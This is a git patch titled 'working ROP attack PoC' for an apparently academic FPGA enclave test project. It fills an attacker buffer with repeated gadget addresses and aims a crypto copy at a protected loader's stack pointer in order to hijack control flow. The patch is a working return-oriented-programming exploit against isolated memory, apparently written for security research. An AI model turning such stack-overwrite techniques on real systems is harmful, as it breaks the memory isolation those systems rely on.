@@ -1,0 +1,70 @@
+From 1f8cd605e70772f6d7c3217152efd8856657ec0c Mon Sep 17 00:00:00 2001
+From: [removed]
+Date: [removed]
+Subject: [PATCH 2/2] working ROP attack PoC
+
+---
+ crypttest_fpga/asm.S  | 12 ++++++++++++
+ crypttest_fpga/main.c |  6 +++---
+ 2 files changed, 15 insertions(+), 3 deletions(-)
+
+diff --git a/crypttest_fpga/asm.S b/crypttest_fpga/asm.S
+index 4117fe8..0608bc0 100644
+--- a/crypttest_fpga/asm.S
++++ b/crypttest_fpga/asm.S
+@@ -1,6 +1,17 @@
+     .section ".spm.crypt_attacker.text"
+     .align 2
+     /* should be multiple of block size (16B) */
++    .word 0x547c
++    .word 0x547c
++    .word 0x547c
++    .word 0x547c
++    .word 0x547c
++    .word 0x547c
++    .word 0x547c
++    .word 0x547c
++
++
++/*
+     .word 0x1100
+     .word 0x3322
+     .word 0x5544
+@@ -9,3 +20,4 @@
+     .word 0xbbaa
+     .word 0xddcc
+     .word 0xffee
++*/
+diff --git a/crypttest_fpga/main.c b/crypttest_fpga/main.c
+index 125dd6e..f5283bc 100644
+--- a/crypttest_fpga/main.c
++++ b/crypttest_fpga/main.c
+@@ -66,14 +66,14 @@ int main()
+     printf("done\n");
+ 
+     attacker_src = &__spm_crypt_attacker_public_start_crypt; // src_buf;
+-    attacker_dest = /*&__spm_sm_loader_sp - 12; //*/dest_buf;
++    attacker_dest = &__spm_sm_loader_sp - 14; //*/dest_buf;
+ 
+     printf("attacker_src is:  ");
+     print_bytes(attacker_src, AES_BLOCK_SIZE);
+     printf("\n");
+ #if 1
+     printf("attacker_dest is: ");
+-    print_bytes(attacker_dest, AES_BLOCK_SIZE);
++    print_bytes(attacker_src, AES_BLOCK_SIZE);
+     printf("\n");
+ #endif
+ 
+@@ -94,7 +94,7 @@ int main()
+     printf("attacker_src is:  ");
+     print_bytes(attacker_src, AES_BLOCK_SIZE);
+     printf("\n");
+-#if 1
++#if 0
+     printf("attacker_dest is: ");
+     print_bytes(attacker_dest, AES_BLOCK_SIZE);
+     printf("\n");
+-- 
+2.7.4
+
